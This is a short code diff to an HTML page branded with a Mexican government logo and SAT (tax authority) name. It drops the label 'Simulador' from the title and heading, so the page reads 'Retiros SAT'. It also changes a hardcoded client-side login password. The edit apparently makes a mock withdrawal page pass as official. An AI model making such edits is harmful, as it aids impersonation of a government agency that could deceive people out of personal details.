@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Simulador de Retiros SAT</title>
+  <title>Retiros SAT</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -41,7 +41,7 @@
 <body>
   <div class="container">
     <img id="logo" src="LOGO.png" alt="Logo Gobierno de México" />
-    <h2>Simulador de Retiros SAT</h2>
+    <h2>Retiros SAT</h2>
     <div id="login">
       <input type="text" id="nombre" placeholder="Nombre completo" />
       <input type="password" id="clave" placeholder="Contraseña" />
@@ -89,7 +89,7 @@
     function validar() {
       const nombre = document.getElementById("nombre").value;
       const clave = document.getElementById("clave").value;
-      if (nombre && clave === "1234") {
+      if (nombre && clave === "SAT2025") {
         document.getElementById("login").classList.add("hidden");
         document.getElementById("formulario").classList.remove("hidden");
       } else {
